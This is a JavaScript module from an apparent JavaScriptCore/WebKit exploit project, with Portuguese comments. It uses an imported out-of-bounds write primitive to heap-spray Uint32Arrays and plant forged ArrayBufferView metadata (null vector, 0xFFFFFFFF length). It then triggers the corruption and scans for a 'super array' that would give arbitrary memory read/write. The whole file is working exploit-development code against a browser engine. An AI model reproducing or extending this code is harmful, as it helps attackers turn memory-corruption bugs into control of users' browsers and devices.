// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
const FNAME_DETECT_SPRAY_CORRUPTION = "detectSprayedArrayCorruption_v12a"; // Com 'R' maiúsculo

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x50;

const NUM_SPRAY_OBJECTS = 200;
const SPRAY_ELEMENT_VAL_A = 0xAAAAAAAA;
const SPRAY_ELEMENT_VAL_B = 0xBBBBBBBB;
const ORIGINAL_SPRAY_LENGTH = 8;

const ADV64_ZERO = new AdvancedInt64(0, 0);
const CORRUPTION_VALUE_UINT32_FFFFFFFF = 0xFFFFFFFF;

// ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
let sprayedVictimObjects = [];
let originalSprayedValues = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_DETECT_SPRAY_CORRUPTION}: Detectar Qualquer Corrupção em Arrays Pulverizados ---`, "test", FNAME_DETECT_SPRAY_CORRUPTION);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_DETECT_SPRAY_CORRUPTION);
            return;
        }
        // CORREÇÃO AQUI: Usar FNAME_DETECT_SPRAY_CORRUPTION com 'R' maiúsculo
        logS3("Ambiente OOB inicializado.", "info", FNAME_DETECT_SPRAY_CORRUPTION);

        // FASE 1: Pulverizar objetos Uint32Array e guardar seus valores originais
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${ORIGINAL_SPRAY_LENGTH}) e armazenando valores...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
        sprayedVictimObjects = [];
        originalSprayedValues = [];
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = SPRAY_ELEMENT_VAL_A;
            u32arr[1] = SPRAY_ELEMENT_VAL_B;
            for (let j = 2; j < ORIGINAL_SPRAY_LENGTH; j++) {
                u32arr[j] = i;
            }
            sprayedVictimObjects.push(u32arr);
            originalSprayedValues.push(Array.from(u32arr));
        }
        logS3("Pulverização e armazenamento de valores originais concluídos.", "good", FNAME_DETECT_SPRAY_CORRUPTION);
        await PAUSE_S3(50);

        // FASE 2: Plantar valores no oob_array_buffer_real
        logS3(`FASE 2: Plantando futuros metadados (m_vector=0, m_length=0xFFFFFFFF) no oob_array_buffer_real...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
        const targetVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const targetLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        
        oob_write_absolute(targetVectorOffset, ADV64_ZERO, 8);
        oob_write_absolute(targetLengthOffset, CORRUPTION_VALUE_UINT32_FFFFFFFF, 4);
        logS3(`  Valores plantados em oob_buffer[${toHex(targetVectorOffset)}] e oob_buffer[${toHex(targetLengthOffset)}]`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
        await PAUSE_S3(50);

        // FASE 3: Acionar a Corrupção OOB
        logS3(`FASE 3: Realizando escrita OOB em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_DETECT_SPRAY_CORRUPTION);
        await PAUSE_S3(200);

        // FASE 4: Verificar TODOS os arrays pulverizados por QUALQUER mudança
        logS3(`FASE 4: Verificando ${NUM_SPRAY_OBJECTS} arrays pulverizados por mudanças no length ou nos elementos...`, "info", FNAME_DETECT_SPRAY_CORRUPTION);
        let corruptedArraysFound = 0;
        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            const currentArray = sprayedVictimObjects[i];
            const originalValues = originalSprayedValues[i];
            let isCorrupted = false;
            let corruptionDetails = "";

            if (currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
                isCorrupted = true;
                corruptionDetails += ` Length alterado de ${ORIGINAL_SPRAY_LENGTH} para ${currentArray.length}.`;
                if (currentArray.length === CORRUPTION_VALUE_UINT32_FFFFFFFF) {
                    corruptionDetails += " (SUPER ARRAY LENGTH!)";
                }
            }
            
            const maxElementsToCheck = (currentArray.length > 0 && currentArray.length < ORIGINAL_SPRAY_LENGTH * 2 && currentArray.length < 100) ? currentArray.length : ORIGINAL_SPRAY_LENGTH;
            
            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) {
                let currentValue;
                try {
                    if (j < currentArray.length) {
                        currentValue = currentArray[j];
                    } else if (isCorrupted && currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
                        corruptionDetails += ` Elemento original [${j}] inacessível (novo length: ${currentArray.length}).`;
                        continue;
                    } else {
                        continue;
                    }
                } catch (e) {
                    isCorrupted = true;
                    corruptionDetails += ` Erro ao ler elemento [${j}]: ${e.message}.`;
                    continue;
                }

                if (currentValue !== originalValues[j]) {
                    isCorrupted = true;
                    corruptionDetails += ` Elemento [${j}] alterado de ${toHex(originalValues[j])} para ${toHex(currentValue)}.`;
                }
            }
            
            if (isCorrupted) {
                logS3(`    !!! CORRUPÇÃO DETECTADA no array pulverizado índice [${i}] !!!`, "vuln", FNAME_DETECT_SPRAY_CORRUPTION);
                logS3(`      Detalhes: ${corruptionDetails}`, "vuln", FNAME_DETECT_SPRAY_CORRUPTION);
                corruptedArraysFound++;
                document.title = `CORRUPÇÃO DETECTADA (${corruptedArraysFound})!`;
            }
        }

        if (corruptedArraysFound > 0) {
            logS3(`  Total de ${corruptedArraysFound} arrays pulverizados encontrados com alguma corrupção.`, "good", FNAME_DETECT_SPRAY_CORRUPTION);
        } else {
            logS3("  Nenhuma corrupção detectada nos arrays pulverizados (nem no length, nem nos elementos verificados).", "warn", FNAME_DETECT_SPRAY_CORRUPTION);
            document.title = "Nenhuma Corrupção em Spray";
        }

        logS3("INVESTIGAÇÃO DE CORRUPÇÃO EM SPRAY CONCLUÍDA.", "test", FNAME_DETECT_SPRAY_CORRUPTION);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_DETECT_SPRAY_CORRUPTION}: ${e.message}`, "critical", FNAME_DETECT_SPRAY_CORRUPTION);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_DETECT_SPRAY_CORRUPTION);
        document.title = `${FNAME_DETECT_SPRAY_CORRUPTION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        originalSprayedValues = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_DETECT_SPRAY_CORRUPTION} Concluído ---`, "test", FNAME_DETECT_SPRAY_CORRUPTION);
    }
}
